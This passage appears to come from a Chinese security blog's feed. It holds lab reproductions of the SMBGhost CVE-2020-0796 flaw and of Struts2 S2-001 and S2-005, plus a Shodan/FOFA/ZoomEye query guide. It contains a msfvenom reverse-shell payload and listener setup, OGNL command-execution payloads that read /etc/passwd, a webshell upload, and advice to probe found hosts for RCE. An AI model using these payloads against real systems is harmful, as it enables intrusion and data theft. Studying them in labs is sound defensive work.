18362.175</p><p><img src="https://s1.ax1x.com/2020/08/29/d77KVH.png" alt="d77KVH.png"></p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>exe版本（奇安信）<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip" target="_blank" rel="noopener">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a></p><p>使用CVE-2020-0796 检测工具扫描我之前安装的虚拟机进行测试。</p><p><img src="https://s1.ax1x.com/2020/08/28/doEYOH.png" alt="doEYOH.png"></p><p>发现存在该漏洞。于是想办法进行漏洞的复现和利用。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><a href="https://github.com/eerykitty/CVE-2020-0796-PoC" target="_blank" rel="noopener">https://github.com/eerykitty/CVE-2020-0796-PoC</a></p><p>蓝屏POC</p><pre><code>#!/usr/bin/env python3from smbclient import (    link,    open_file,    remove,    register_session,    stat,    symlink,)import sysif len(sys.argv) &lt; 2:    print(&quot;usage: ./CVE-2020-0796.py servername&quot;)    sys.exit(1)register_session(sys.argv[1], username=&quot;fakeusername&quot;,     password=&quot;password&quot;, encrypt=False) # encryption must be disabled</code></pre><p><img src="https://s1.ax1x.com/2020/08/28/doEy6g.png" alt="doEy6g.png"></p><p>攻击成功，受害主机重启。</p><p><img src="https://s1.ax1x.com/2020/08/28/doEgmj.png" alt="doEgmj.png"></p><p>蓝屏poc成功利用。</p><h2 id="本地提权POC："><a href="#本地提权POC：" class="headerlink" title="本地提权POC："></a>本地提权POC：</h2><pre><code>https://github.com/danigargu/CVE-2020-0796</code></pre><p>本地普通用户Bypass执行提权exp后弹出cmd窗口，成功获取system权限。</p><h2 id="远程利用代码："><a href="#远程利用代码：" class="headerlink" title="远程利用代码："></a>远程利用代码：</h2><blockquote><p>RHOST（远程主机，即靶机的IP地址）和一个LHOST（本地主机，即攻击机的IP地址，这里指的时kali地址）</p></blockquote><p>用msf生成python的shellcode</p><p><code>msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.159 LPORT=6666 -f python -o shellcode.txt</code></p><p><strong>把生成的shellcode里的buf替换成USER_PAYLOAD</strong></p><p><img src="https://s1.ax1x.com/2020/08/29/d773Gt.png" alt="d773Gt.png"></p><p><strong>把exploit.py里的USER_PAYLOAD替换为用msf生成的shellcode</strong></p><p>exploit.py下载地址:<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC" target="_blank" rel="noopener">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p><p>msf里面启动监听：</p><pre><code>msf5 &gt; msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.128 LPORT=6666 -f python -o shellcode.txt[*] exec: msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.128 LPORT=6666 -f python -o shellcode.txtNo encoder or badchars specified, outputting raw payloadPayload size: 510 bytesFinal size of python file: 2491 bytesSaved as: shellcode.txtmsf5 &gt; use exploit/Display all 1947 possibilities? (y or n)msf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcppayload =&gt; windows/x64/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set lhost 192.168.2.128lhost =&gt; 192.168.2.128msf5 exploit(multi/handler) &gt; set lport 6666lport =&gt; 6666msf5 exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 192.168.2.128:6666</code></pre><p><img src="https://s1.ax1x.com/2020/08/29/d77tsS.png" alt="d77tsS.png"></p><p>运行poc，执行失败，未找到原因。漏洞远程命令执行复现失败。</p><p><code>python3 exploit.py -ip 192.168.100.144</code></p><p><img src="https://s1.ax1x.com/2020/08/29/d77szV.png" alt="d77szV.png"></p><p>使用python2运行此命令，导致靶机蓝屏。</p><p><img src="https://s1.ax1x.com/2020/08/29/d77RZ4.png" alt="d77RZ4.png"></p><p>msf没有返回任何信息。查看靶机已蓝屏。</p><p><img src="https://s1.ax1x.com/2020/08/28/doEgmj.png" alt="doEgmj.png"></p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>Microsoft已经为此发布了一个安全一个安全公告（March 12, 2020—KB4551762）以及相应补丁:<br>March 12, 2020—KB4551762 (OS Builds 18362.720 and 18363.720)<br>下载：<a href="https://www.catalog.update.microsoft.com/Search.aspx?q=KB4551762" target="_blank" rel="noopener">https://www.catalog.update.microsoft.com/Search.aspx?q=KB4551762</a></p><ol><li>微软已经发布了此漏洞的安全补丁，访问如下链接：</li></ol><p>​    <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796" target="_blank" rel="noopener">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796</a></p><ol start="2"><li><p>如果暂时无法安装补丁，微软当前建议按如下临时解决方案处理：执行以下命令</p><p><code>Set-ItemProperty-Path &quot;HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters&quot;DisableCompression -Type DWORD -Value 1 -Force</code> </p><p>禁用SMB 3.0的压缩功能，是否使用需要结合自己业务进行判断。</p></li></ol><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://xz.aliyun.com/t/7440#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/7440#toc-0</a></p><p><a href="https://github.com/eerykitty/CVE-2020-0796-PoC" target="_blank" rel="noopener">https://github.com/eerykitty/CVE-2020-0796-PoC</a></p><p>远程利用代码参考：</p><p><a href="https://forum.90sec.com/t/topic/1105/2" target="_blank" rel="noopener">https://forum.90sec.com/t/topic/1105/2</a></p><p><a href="https://www.cnblogs.com/xiaozi/p/13062533.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozi/p/13062533.html</a></p><p><a href="https://github.com/Mr-xn/Penetration_Testing_POC/blob/master/books/Windows_SMBv3_RCE_CVE-2020-0796漏洞复现.pdf" target="_blank" rel="noopener">https://github.com/Mr-xn/Penetration_Testing_POC/blob/master/books/Windows_SMBv3_RCE_CVE-2020-0796%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.pdf</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> cve </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络空间搜索引擎</title>
      <link href="/2020/08/28/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2020/08/28/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h1><p><strong>如果说GPS绘制出了世界的地图，那么网络空间搜索引擎就是整个互联网的地图。</strong></p><p>网络空间搜索引擎的作用就是将互联网上公开的网络资产收集和整理，以此方便人们进行查阅和利用。</p><h2 id="钟馗之眼-ZoomEye"><a href="#钟馗之眼-ZoomEye" class="headerlink" title="钟馗之眼-ZoomEye"></a>钟馗之眼-ZoomEye</h2><p><a href="https://www.zoomeye.org/" target="_blank" rel="noopener">https://www.zoomeye.org/</a></p><p><strong>ZoomEye</strong>是一款针对网络空间的搜索引擎，收录了互联网空间中的设备、网站及其使用的服务或组件等信息。</p><p><strong>ZoomEye</strong> 拥有两大探测引擎：<strong>Xmap 和 Wmap</strong>，分别针对网络空间中的设备及网站，通过 24 小时不间断的探测、识别，标识出互联网设备及网站所使用的服务及组件。研究人员可以通过 ZoomEye 方便的了解组件的普及率及漏洞的危害范围等信息。</p><p><strong>ZoomEye</strong>默认普通用户只能查看400条搜索结果。</p><h3 id="页面布局"><a href="#页面布局" class="headerlink" title="页面布局"></a>页面布局</h3><p><img src="https://s1.ax1x.com/2020/08/28/d5v39I.png" alt="d5v39I.png"></p><p>“相关漏洞”给出各大组件、服务器系统等存在的历史性漏洞的描述文档</p><p><img src="https://s1.ax1x.com/2020/08/28/d5vtu8.png" alt="d5vtu8.png"></p><h3 id="ZoomEye搜索技巧"><a href="#ZoomEye搜索技巧" class="headerlink" title="ZoomEye搜索技巧"></a>ZoomEye搜索技巧</h3><p>关键字之间表示并列关系使用”+”加号连接。</p><p>在不知道目标信息，对结果进行筛选时，使用”-“减号进行排除关键字操作。</p><ul><li>指定搜索的组件：<ul><li>app：组件名称</li><li>ver：组件版本</li></ul></li><li>指定搜素的端口<ul><li>port:端口号</li></ul></li><li>指定搜索的地理位置范围：<ul><li>country：国家名</li></ul></li><li>指定网站域名进行搜索：<ul><li>Site:网站域名</li></ul></li></ul><h2 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h2><p><a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a></p><p>Shodan 是用来搜索网络空间中在线设备的，你可以通过 Shodan 搜索指定的设备，或者搜索特定类型的设备。</p><p>Shodan分免费账户和会员账户，免费账户对一些标签的搜索和多标签关联搜索有限制，而会员的话就可以任意进行一些搜索。</p><h3 id="使用搜索过滤"><a href="#使用搜索过滤" class="headerlink" title="使用搜索过滤"></a>使用搜索过滤</h3><p>如果单纯只使用关键字直接进行搜索，搜索结果可能不尽人意，那么此时我们就需要使用一些特定的命令对搜索结果进行过滤，常见用的过滤命令如下所示：</p><ul><li><code>hostname</code>：搜索指定的主机或域名，例如 <code>hostname:&quot;google&quot;</code></li><li><code>port</code>：搜索指定的端口或服务，例如 <code>port:&quot;21&quot;</code></li><li><code>country</code>：搜索指定的国家，例如 <code>country:&quot;CN&quot;</code></li><li><code>city</code>：搜索指定的城市，例如 <code>city:&quot;Hefei&quot;</code></li><li><code>org</code>：搜索指定的组织或公司，例如 <code>org:&quot;google&quot;</code></li><li><code>isp</code>：搜索指定的ISP供应商，例如 <code>isp:&quot;China Telecom&quot;</code></li><li><code>product</code>：搜索指定的操作系统/软件/平台，例如 <code>product:&quot;Apache httpd&quot;</code></li><li><code>version</code>：搜索指定的软件版本，例如 <code>version:&quot;1.6.2&quot;</code></li><li><code>geo</code>：搜索指定的地理位置，参数为经纬度，例如 <code>geo:&quot;31.8639, 117.2808&quot;</code></li><li><code>before/after</code>：搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 <code>before:&quot;11-11-15&quot;</code></li><li><code>net</code>：搜索指定的IP地址或子网，例如 <code>net:&quot;210.45.240.0/24&quot;</code></li><li><code>os</code> :  指定操作系统 centOS,windows,red hat,suse 等…</li><li><code>vuln</code>：CVE漏洞编号，例如<code>vuln:CVE-2018-3191</code></li></ul><h3 id="搜索实例"><a href="#搜索实例" class="headerlink" title="搜索实例"></a>搜索实例</h3><p>搜集某个城市的特定设备 [这里暂以不同类型的web服务器为例] 标识 [自己可以事先多收集一些常见的软件和设备标识]:</p><ul><li>Microsoft-IIS/5.0 city:”TOKYO”   可逐个尝试能否直接写shell</li><li>Microsoft-IIS/6.0 city:”Seoul”     可逐个尝试能否直接 RCE</li><li>Microsoft-IIS/7.5 city:”Hong Kong” </li><li>apache city:”Nagoya” </li><li>Apache/2.2.27 city:”Nagoya”</li><li>Tomcat city:”Seoul”    可逐个尝试能否直接 RCE</li><li>cisco city:”Osaka”</li><li>tplink city:”nanjing”</li></ul><blockquote><p>远程命令执行英文名称：RCE (remote code execution) ，简称RCE漏洞，是指用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变$PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。</p></blockquote><p><img src="https://s1.ax1x.com/2020/08/28/d5vDCn.png" alt="d5vDCn.png"></p><p>搜索特定版本的操作系统及端口:</p><ul><li>os:”linux” net:”72.34.62.0/24”</li><li>os:”windows” net:”195.40.91.0/24”</li><li>Apache city:”Hong Kong” port:”8080”  product:”Apache Tomcat/Coyote JSP engine”</li><li>Apache city:”Seoul” port:”8080”</li><li>hostname:”.polyu.edu.hk” os:”windows”</li></ul><p><img src="https://s1.ax1x.com/2020/08/28/d5vgDU.png" alt="d5vgDU.png"></p><p>扫描指定网段内的所有特定数据库服务器:</p><ul><li>product:”Mysql”  net:”140.117.13.0/24” port:”3306”</li><li>port:”1433” net:”78.131.197.0/24”</li><li>port:”5432” net:”77.55.149.0/24”</li><li>port:”1521” net:”78.143.192.0/12”</li><li>port:”1521” city:”Osaka”</li></ul><p><img src="https://s1.ax1x.com/2020/08/28/d5vfUJ.png" alt="d5vfUJ.png"></p><p>搜索特定远程管理终端端口:</p><ul><li>os:”windows” port:”3389” net:”107.160.1.0/24”</li><li>os:”linux” port:”22” net:”107.160.1.0/24”</li><li>os:”linux” port:”23” net:”107.160.1.0/24”</li><li>os:”linux” port:”23” net:”87.124.0.0/15”</li></ul><p><img src="https://s1.ax1x.com/2020/08/28/d5vxPA.png" alt="d5vxPA.png"></p><p><strong>根据实际需求使用搜索过滤特征</strong>，用这些搜索引擎的时候,最好全程挂上vpn,推荐美国的。</p><h2 id="Fofa"><a href="#Fofa" class="headerlink" title="Fofa"></a>Fofa</h2><p><a href="https://fofa.so/" target="_blank" rel="noopener">https://fofa.so/</a></p><p>FOFA是白帽汇推出的一款网络空间资产搜索引擎。它能够帮助用户迅速进行网络资产匹配、加快后续工作进程。例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等。</p><h3 id="查询语法"><a href="#查询语法" class="headerlink" title="查询语法"></a>查询语法</h3><blockquote><p>直接输入查询语句，将从标题，html内容，http头信息，url字段中搜索；如果查询表达式有多个与或关系，尽量在外面用（）包含起来；* 新增==完全匹配的符号，可以加快搜索速度，比如查找qq.com所有host，可以是domain==”qq.com” *</p></blockquote><ul><li><p>高级搜索</p><p>可以使用括号 和 &amp;&amp; || !=等符号，如</p><p>title=”powered by” &amp;&amp; title!=discuz </p><p>title=”powered by” &amp;&amp; title!=discuz </p><p>( body=”content=”WordPress” || (header=”X-Pingback” &amp;&amp; header=”/xmlrpc.php” &amp;&amp; body=”/wp-includes/“) &amp;&amp; host=”gov.cn” </p></li></ul><p><img src="https://s1.ax1x.com/2020/08/28/d5xS2t.png" alt="d5xS2t.png"></p><table><thead><tr><th><a href="https://fofa.so/result?qbase64=dGl0bGU9ImJlaWppbmci" target="_blank" rel="noopener">title=”beijing”</a></th><th>从标题中搜索“北京”</th><th>-</th></tr></thead><tbody><tr><td><a href="https://fofa.so/result?qbase64=aGVhZGVyPSJqYm9zcyI%3D" target="_blank" rel="noopener">header=”jboss”</a></td><td>从http头中搜索“jboss”</td><td>-</td></tr><tr><td><a href="https://fofa.so/result?qbase64=Ym9keT0iSGFja2VkIGJ5Ig%3D%3D" target="_blank" rel="noopener">body=”Hacked by”</a></td><td>从html正文中搜索abc</td><td>-</td></tr><tr><td><a href="https://fofa.so/result?qbase64=ZG9tYWluPSJxcS5jb20i" target="_blank" rel="noopener">domain=”qq.com”</a></td><td>搜索根域名带有qq.com的网站。</td><td>-</td></tr><tr><td><a href="https://fofa.so/result?qbase64=aWNvbl9oYXNoPSItMjQ3Mzg4ODkwIg%3D%3D" target="_blank" rel="noopener">icon_hash=”-247388890”</a></td><td>搜索使用此icon的资产。</td><td>仅限高级会员使用</td></tr><tr><td><a href="https://fofa.so/result?qbase64=aG9zdD0iLmdvdi5jbiI%3D" target="_blank" rel="noopener">host=”.gov.cn”</a></td><td>从url中搜索”.gov.cn”</td><td>搜索要用host作为名称</td></tr><tr><td><a href="https://fofa.so/result?qbase64=cG9ydD0iNDQzIg%3D%3D" target="_blank" rel="noopener">port=”443”</a></td><td>查找对应“443”端口的资产</td><td>-</td></tr><tr><td><a href="https://fofa.so/result?qbase64=aXA9IjEuMS4xLjEi" target="_blank" rel="noopener">ip=”1.1.1.1”</a></td><td>从ip中搜索包含“1.1.1.1”的网站</td><td>搜索要用ip作为名称</td></tr><tr><td><a href="https://fofa.so/result?qbase64=aXA9IjIyMC4xODEuMTExLjEvMjQi" target="_blank" rel="noopener">ip=”220.181.111.1/24”</a></td><td>查询IP为“220.181.111.1”的C网段资产</td><td>-</td></tr><tr><td><a href="https://fofa.so/result?qbase64=c3RhdHVzX2NvZGU9NDAy" target="_blank" rel="noopener">status_code=”402”</a></td><td>查询服务器状态为“402”的资产</td><td>-</td></tr><tr><td><a href="https://fofa.so/result?qbase64=cHJvdG9jb2w9Imh0dHBzIg%3D%3D" target="_blank" rel="noopener">protocol=”https”</a></td><td>查询https协议资产</td><td>搜索指定协议类型(在开启端口扫描的情况下有效)</td></tr><tr><td><a href="https://fofa.so/result?qbase64=Y2l0eT0iSGFuZ3pob3Ui" target="_blank" rel="noopener">city=”Hangzhou”</a></td><td>搜索指定城市的资产。</td><td>-</td></tr><tr><td><a href="https://fofa.so/result?qbase64=cmVnaW9uPSJaaGVqaWFuZyI%3D" target="_blank" rel="noopener">region=”Zhejiang”</a></td><td>搜索指定行政区的资产。</td><td>-</td></tr><tr><td><a href="https://fofa.so/result?qbase64=Y291bnRyeT0iQ04i" target="_blank" rel="noopener">country=”CN”</a></td><td>搜索指定国家(编码)的资产。</td><td>-</td></tr><tr><td><a href="https://fofa.so/result?qbase64=Y2VydD0iZ29vZ2xlIg%3D%3D" target="_blank" rel="noopener">cert=”google”</a></td><td>搜索证书(https或者imaps等)中带有google的资产。</td><td>-</td></tr><tr><td><a href="https://fofa.so/result?qbase64=YmFubmVyPXVzZXJzICYmIHByb3RvY29sPWZ0cA%3D%3D" target="_blank" rel="noopener">banner=users &amp;&amp; protocol=ftp</a></td><td>搜索FTP协议中带有users文本的资产。</td><td>-</td></tr><tr><td><a href="https://fofa.so/result?qbase64=dHlwZT1zZXJ2aWNl" target="_blank" rel="noopener">type=service</a></td><td>搜索所有协议资产，支持subdomain和service两种。</td><td>搜索所有协议资产</td></tr><tr><td><a href="https://fofa.so/result?qbase64=b3M9d2luZG93cw%3D%3D" target="_blank" rel="noopener">os=windows</a></td><td>搜索Windows资产。</td><td>-</td></tr><tr><td><a href="https://fofa.so/result?qbase64=c2VydmVyPT0iTWljcm9zb2Z0LUlJUy83LjUi" target="_blank" rel="noopener">server==”Microsoft-IIS/7.5”</a></td><td>搜索IIS 7.5服务器。</td><td>-</td></tr><tr><td><a href="https://fofa.so/result?qbase64=YXBwPSLmtbflurflqIHop4Yt6KeG6aKR55uR5o6nIg%3D%3D" target="_blank" rel="noopener">app=”海康威视-视频监控”</a></td><td>搜索海康威视设备</td><td>-</td></tr><tr><td><a href="https://fofa.so/result?qbase64=YWZ0ZXI9IjIwMTciICZhbXA7JmFtcDsgYmVmb3JlPSIyMDE3LTEwLTAxIg%3D%3D" target="_blank" rel="noopener">after=”2017” &amp;&amp; before=”2017-10-01”</a></td><td>时间范围段搜索</td><td>-</td></tr><tr><td><a href="https://fofa.so/result?qbase64=YXNuPSIxOTU1MSI%3D" target="_blank" rel="noopener">asn=”19551”</a></td><td>搜索指定asn的资产。</td><td>-</td></tr><tr><td><a href="https://fofa.so/result?qbase64=b3JnPSJBbWF6b24uY29tLCBJbmMuIg%3D%3D" target="_blank" rel="noopener">org=”Amazon.com, Inc.”</a></td><td>搜索指定org(组织)的资产。</td><td>-</td></tr><tr><td><a href="https://fofa.so/result?qbase64=YmFzZV9wcm90b2NvbD0idWRwIg%3D%3D" target="_blank" rel="noopener">base_protocol=”udp”</a></td><td>搜索指定udp协议的资产。</td><td>-</td></tr><tr><td><a href="https://fofa.so/result?qbase64=aXNfaXB2Nj10cnVl" target="_blank" rel="noopener">is_ipv6=true</a></td><td>搜索ipv6的资产</td><td>搜索ipv6的资产,只接受true和false。</td></tr><tr><td><a href="https://fofa.so/result?qbase64=aXNfZG9tYWluPXRydWU%3D" target="_blank" rel="noopener">is_domain=true</a></td><td>搜索域名的资产</td><td>搜索域名的资产,只接受true和false。</td></tr><tr><td><a href="https://fofa.so/result?qbase64=aXBfcG9ydHM9IjgwLDE2MSI%3D" target="_blank" rel="noopener">ip_ports=”80,161”</a></td><td>搜索同时开放80和161端口的ip</td><td>搜索同时开放80和161端口的ip资产(以ip为单位的资产数据)</td></tr><tr><td><a href="https://fofa.so/result?qbase64=cG9ydF9zaXplPSI2Ig%3D%3D" target="_blank" rel="noopener">port_size=”6”</a></td><td>查询开放端口数量等于”6”的资产</td><td>仅限FOFA会员使用</td></tr><tr><td><a href="https://fofa.so/result?qbase64=cG9ydF9zaXplX2d0PSIzIg%3D%3D" target="_blank" rel="noopener">port_size_gt=”3”</a></td><td>查询开放端口数量大于”3”的资产</td><td>仅限FOFA会员使用</td></tr><tr><td><a href="https://fofa.so/result?qbase64=cG9ydF9zaXplX2x0PSIxMiI%3D" target="_blank" rel="noopener">port_size_lt=”12”</a></td><td>查询开放端口数量小于”12”的资产</td><td>仅限FOFA会员使用</td></tr><tr><td><a href="https://fofa.so/result?qbase64=aXBfY291bnRyeT0iQ04i" target="_blank" rel="noopener">ip_country=”CN”</a></td><td>搜索中国的ip资产(以ip为单位的资产数据)。</td><td>搜索中国的ip资产</td></tr><tr><td><a href="https://fofa.so/result?qbase64=aXBfcmVnaW9uPSJaaGVqaWFuZyI%3D" target="_blank" rel="noopener">ip_region=”Zhejiang”</a></td><td>搜索指定城市的ip资产(以ip为单位的资产数据)。</td><td>搜索指定城市的资产</td></tr><tr><td><a href="https://fofa.so/result?qbase64=aXBfY2l0eT0iSGFuZ3pob3Ui" target="_blank" rel="noopener">ip_city=”Hangzhou”</a></td><td>搜索指定城市的ip资产(以ip为单位的资产数据)。</td><td>搜索指定城市的资产</td></tr><tr><td><a href="https://fofa.so/result?qbase64=aXBfYWZ0ZXI9IjIwMTktMDEtMDEi" target="_blank" rel="noopener">ip_after=”2019-01-01”</a></td><td>搜索2019-01-01以后的ip资产(以ip为单位的资产数据)。</td><td>搜索2019-01-01以后的ip资产</td></tr><tr><td><a href="https://fofa.so/result?qbase64=aXBfYmVmb3JlPSIyMDE5LTA3LTAxIg%3D%3D" target="_blank" rel="noopener">ip_before=”2019-07-01”</a></td><td>搜索2019-07-01以前的ip资产(以ip为单位的资产数据)。</td><td>搜索2019-07-01以前的ip资产</td></tr></tbody></table><p>参考资料：</p><p><a href="https://www.freebuf.com/sectool/129211.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/129211.html</a></p><p><a href="https://klionsec.github.io/2014/12/15/shodan-hacking/#menu" target="_blank" rel="noopener">https://klionsec.github.io/2014/12/15/shodan-hacking/#menu</a></p><p><a href="https://www.freebuf.com/sectool/121339.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/121339.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>S2-005 远程代码执行漏洞</title>
      <link href="/2020/08/15/S2-005/"/>
      <url>/2020/08/15/S2-005/</url>
      
        <content type="html"><![CDATA[<h1 id="S2-005-远程代码执行漏洞"><a href="#S2-005-远程代码执行漏洞" class="headerlink" title="S2-005 远程代码执行漏洞"></a>S2-005 远程代码执行漏洞</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>参考吴翰清的《白帽子讲Web安全》一书。</p><blockquote><p>s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上</p></blockquote><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>执行以下命令启动s2-005测试环境</p><pre><code>docker-compose builddocker-compose up -d</code></pre><p><img src="https://s1.ax1x.com/2020/08/15/dFOgds.png" alt="dFOgds.png"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>使用网上的POC复现失败，用Struts2全版本测试工具进行测试</p><p><img src="https://s1.ax1x.com/2020/08/15/dFOWiq.png" alt="dFOWiq.png"></p><p>验证存在S2-005漏洞。上传具有上传功能的小马</p><p><img src="https://s1.ax1x.com/2020/08/15/dFOTL4.png" alt="dFOTL4.png"></p><p>上传一句话木马</p><p><img src="https://s1.ax1x.com/2020/08/15/dFOHeJ.png" alt="dFOHeJ.png"></p><p>上传木马成功</p><p><img src="https://s1.ax1x.com/2020/08/15/dFOOF1.png" alt="dFOOF1.png"></p><p>使用木马连接工具，成功getshell。</p><p><img src="https://s1.ax1x.com/2020/08/15/dFOzQO.png" alt="dFOzQO.png"></p><p><img src="https://s1.ax1x.com/2020/08/15/dFXCeH.png" alt="dFXCeH.png"></p><p>完。</p>]]></content>
      
      
      
        <tags>
            
            <tag> struts </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>struts2-001 远程代码执行漏洞</title>
      <link href="/2020/08/15/struts2-001/"/>
      <url>/2020/08/15/struts2-001/</url>
      
        <content type="html"><![CDATA[<h1 id="struts2-001-远程代码执行漏洞"><a href="#struts2-001-远程代码执行漏洞" class="headerlink" title="struts2-001 远程代码执行漏洞"></a>struts2-001 远程代码执行漏洞</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>启动测试环境。<a href="http://192.168.200.130:8080/" target="_blank" rel="noopener">http://192.168.200.130:8080/</a></p><pre><code>docker-compose builddocker-compose up -d</code></pre><p><img src="https://s1.ax1x.com/2020/08/15/dFONdA.png" alt="dFONdA.png"></p><h2 id="POC-amp-amp-EXP"><a href="#POC-amp-amp-EXP" class="headerlink" title="POC &amp;&amp; EXP"></a>POC &amp;&amp; EXP</h2><p>获取tomcat执行路径：</p><pre><code>%{&quot;tomcatBinDir{&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;}&quot;}</code></pre><p>获取Web路径：</p><pre><code>%{井号req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#39;/&#39;)),#response.flush(),#response.close()}</code></pre><blockquote><p>查了一下，<code>{井号</code> 是 nunjucks 的注释标记， <a href="http://mozilla.github.io/nunjucks/templating.html#comments。" target="_blank" rel="noopener">http://mozilla.github.io/nunjucks/templating.html#comments。</a></p><p>所以只有半个的话，就挂了。</p><p>所以解决办法是 <code>{#</code> 但是这样 post 内容就不是纯的 markdown 了。</p><p>经过实际测试确实是因为 # 导致的。</p></blockquote><p>任意命令执行:（命令加参数：<code>new java.lang.String[]{&quot;cat&quot;,&quot;/etc/passwd&quot;}</code>）</p><p>将<code>new java.lang.String[]{&quot;pwd&quot;})</code>中的<code>pwd</code>替换为对应的命令，即可执行。</p><pre><code>%{井号a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;pwd&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}</code></pre><p>再password处输入：</p><pre><code>%{井号a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;cat&quot;,&quot;/etc/passwd&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}</code></pre><p><img src="https://s1.ax1x.com/2020/08/15/dFOdit.png" alt="dFOdit.png"></p><p>bp抓包看请求包信息</p><p><img src="https://s1.ax1x.com/2020/08/15/dFO0Rf.png" alt="dFO0Rf.png"></p><p>完。</p><p>参考资料：<a href="https://chybeta.github.io/2018/02/06/[struts2-命令-代码执行漏洞分析系列]S2-001/" target="_blank" rel="noopener">https://chybeta.github.io/2018/02/06/[struts2-命令-代码执行漏洞分析系列]S2-001/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> struts </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis 4.x/5.x 未授权访问漏洞</title>
      <link href="/2020/08/15/Redis/"/>
      <url>/2020/08/15/Redis/</url>
      
